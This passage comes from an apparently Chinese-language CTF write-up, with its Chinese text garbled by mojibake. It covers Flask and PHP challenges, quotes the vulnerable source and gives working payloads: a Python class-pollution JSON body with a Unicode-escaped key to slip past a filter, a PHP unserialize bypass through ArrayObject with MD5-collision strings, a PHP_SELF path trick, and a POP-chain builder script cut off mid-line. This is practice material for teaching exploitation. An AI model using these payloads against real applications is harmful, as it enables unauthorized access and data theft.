registered_users.append(user)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;æ³°é…·è¾£,æ²¡æœ‰æ³¨å†ŒæˆåŠŸæ&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username ==session[<span class="string">&#x27;username&#x27;</span>]  <span class="keyword">and</span> user.password == session[<span class="string">&#x27;password&#x27;</span>]), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        <span class="keyword">if</span> user.isvip:</span><br><span class="line">            data=request.args.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">and</span> data != <span class="string">&quot;123456789&quot;</span> <span class="keyword">and</span> <span class="built_in">int</span>(data) == <span class="number">123456789</span> <span class="keyword">and</span> <span class="built_in">len</span>(data) &lt;=<span class="number">10</span>:</span><br><span class="line">                        flag = os.environ.get(<span class="string">&#x27;geek_flag&#x27;</span>)</span><br><span class="line">                        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>,flag=flag)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;ä½ çš„æ•°å­—ä¸å¯¹å“¦!&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;I need a num!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&#x27;è¿™ç§ç¥åŠŸä½ ä¸å……VIPä¹Ÿæƒ³å­¦?&lt;p&gt;&lt;img src=&quot;&#123;&#123;url_for(\&#x27;static\&#x27;,filename=\&#x27;weixin.png\&#x27;)&#125;&#125;&quot;&gt;è¦ä¸væˆ‘50,æˆ‘é€ä½ ä¸€ä¸ªVIPå§,å˜»å˜»&lt;/p&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;å…ˆç™»å½•å»&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;8888&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>ä»£ç ä¸­æœ‰ <code>merge()</code> å‡½æ•°ï¼Œå‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://tttang.com/archive/1876/">PythonåŸå‹é“¾æ±¡æŸ“å˜ä½“(prototype-pollution-in-python)</a></p><p>wafä¸­åŒ…å« <code>isvip</code>ï¼Œä½¿ç”¨Unicodeç¼–ç ç»•è¿‡å…³é”®å­—è¿‡æ»¤ã€‚</p><p>å¯¹è·¯ç”± <code>/register</code>ï¼ŒPOST <code>&#123;&quot;username&quot;:&quot;xx&quot;,&quot;password&quot;:&quot;yy&quot;,&quot;__class__&quot; : &#123;&quot;__base__&quot; : &#123;&quot;is\u0076ip&quot; : 1&#125;&#125;&#125;</code></p><p>å†ç™»å½•è®¿é—® <code>/flag</code>ï¼Œç”¨ <code>+</code> ç»•è¿‡åˆ¤æ–­ï¼š<code>/flag?num=+123456789</code>ï¼ŒæŸ¥çœ‹æºç å¾—åˆ°flagã€‚</p><p>â€‹</p><h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><blockquote><p>æˆ‘çš„å¥³ç¥å‘¢ï¼Ÿå¿«å¸®æˆ‘æ‰¾æ‰¾</p></blockquote><p>æºç åœ¨ <code>havefun.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;key.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;è¿›æ¥å•¦&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$randomString</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="variable">$characters</span>), <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="variable">$randomString</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;bro===<span class="variable language_">$this</span>-&gt;secret)&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;qwe;        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;é”™äº†å“¥ä»¬,å†è¯•è¯•å§&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">her</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;å¥½ç´¯ï¼Œå¥½æƒ³ç¡ä¸€è§‰å•Š&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;asd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;ä½ èƒ½æ‰¾åˆ°åŠ å¯†ç”¨çš„keyå’Œå¥¹çš„åå­—å—ï¼Ÿqwq&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">encode</span>(<span class="variable">$this</span>-&gt;hername,<span class="variable">$this</span>-&gt;key) === <span class="string">&#x27;vxvx&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;è§£å¯†æˆåŠŸï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">            <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>,<span class="string">&#x27;r&#x27;</span>) === <span class="string">&quot;loveyou&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;å¿«ç‚¹çš„ï¼Œæ€¥æ€¥æ€¥ï¼ï¼ï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;fun&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;çœŸçš„åªå·®ä¸€æ­¥äº†ï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;å…„å¼Ÿæ€ä¹ˆæçš„ï¼Ÿ&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;ç¡é¥±äº†ï¼Œæ¥ç€æ‰¾ï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;power-&gt;seeyou;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seeyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$seeyou</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;seeyou = <span class="variable">$seeyou</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$random</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="variable">$characters</span>), <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/key\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;QW))&lt;<span class="number">80</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;YXX)&lt;<span class="number">80</span>)&#123;</span><br><span class="line">                <span class="variable">$bool</span>=!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;QW)&amp;&amp;!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;YXX)&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;QW) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;YXX)) &amp;&amp; (<span class="variable language_">$this</span>-&gt;QW != <span class="variable language_">$this</span>-&gt;YXX) <span class="keyword">and</span> <span class="variable">$random</span>===<span class="string">&#x27;newbee&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$bool</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;å¿«æ‹¿åˆ°æˆ‘çš„å°ç§˜å¯†äº†&lt;br&gt;&quot;</span>);</span><br><span class="line">                    <span class="variable">$a</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/HTTP/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>]));</span><br><span class="line">                        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>])===<span class="string">&#x27;key.php&#x27;</span>)&#123;</span><br><span class="line">                            <span class="keyword">echo</span>(<span class="string">&quot;æ‰¾åˆ°äº†ï¼ä½†å¥½åƒä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œæ€ä¹ˆåŠï¼Œæˆ‘å¥½æƒ³å¥¹&lt;br&gt;&quot;</span>);</span><br><span class="line">                            <span class="variable">$file</span> = <span class="string">&quot;key.php&quot;</span>;</span><br><span class="line">                            <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span>(<span class="string">&quot;ä½ åˆ«è¿™æ ·ï¼Œå¥¹ä¼šç”Ÿæ°”çš„â”­â”®ï¹â”­â”®&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;å°±è¿™ç‚¹èƒ½è€ï¼Ÿæ€ä¹ˆå¸®æˆ‘æ‰¾åˆ°å¥¹(â•¥â•¯^â•°â•¥)&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$good</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are good,ä½ å¿«æ‰¾åˆ°æˆ‘çˆ±çš„é‚£ä¸ªå¥¹äº†&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$zhui</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$good</span>;  </span><br><span class="line">        <span class="variable">$zhui</span>[<span class="variable">$good</span>]();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$user</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;ä¸æ˜¯å§ï¼Œç¬¬ä¸€å±‚éƒ½ç»•ä¸è¿‡å»ï¼Ÿï¼Ÿï¼Ÿ&lt;br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;å¿«å¸®æˆ‘æ‰¾æ‰¾å¥¹ï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆååºåˆ—åŒ– <code>useless</code> ç±»çš„ <code>__destruct()</code> æ‹¿åˆ° <code>key.php</code>ï¼š</p><p>ç”¨ <code>ArrayObject</code> ç»•è¿‡ <code>/^[Oa]:[\d]+/i</code>ï¼Œmd5ç¢°æ’ï¼Œå†æ ¹æ® <code>and</code> çš„ä¼˜å…ˆçº§æ— è§† <code>$random</code>ï¼š</p><p><code>C:11:&quot;ArrayObject&quot;:196:&#123;x:i:0;O:7:&quot;useless&quot;:2:&#123;s:2:&quot;QW&quot;;s:64:&quot;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&quot;;s:3:&quot;YXX&quot;;s:64:&quot;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;;&#125;;m:a:0:&#123;&#125;&#125;</code></p><p><code>basename()</code> ç»•è¿‡ <code>$_SERVER[&#39;PHP_SELF&#39;]</code>ï¼š</p><p><code>/havefun.php/key.php?user=C:11:%22ArrayObject%22:196:&#123;x:i:0;O:7:%22useless%22:2:&#123;s:2:%22QW%22;s:64:%22M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2%22;s:3:%22YXX%22;s:64:%22M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2%22;&#125;;m:a:0:&#123;&#125;&#125;&amp;a=PHP_SELF</code></p><p>å¾—åˆ°å›¾ç‰‡ï¼Œä¿¡æ¯æ˜¯ <code>key=9</code>ï¼š</p><p><img src="/2023/11/27/match-Geek-Challenge-2023/download.jpg" alt="download" style="zoom:50%"></p><p>æœ€åå†æ¥ä¸€æ¬¡ååºåˆ—åŒ–é“¾è°ƒç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Me:__wakeup() ï¼ˆå¼•ç”¨ï¼‰</span><br><span class="line">her:__invoke()</span><br><span class="line">important:__sleep()</span><br><span class="line">useless:__get()</span><br><span class="line">her:find()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;qwe = <span class="keyword">new</span> her;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bro = &amp;<span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">her</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;asd = <span class="keyword">new</span> important;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;power = <span class="keyword">new</span> useless;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seeyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;seeyou = <span class="keyword">array</span>(<span class="string">&#x27;seeyou&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> hez,<span class="string">&#x27;find&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hez</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hername = <span class="string">&#x27;momo&#x27;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;key = <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Me</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span 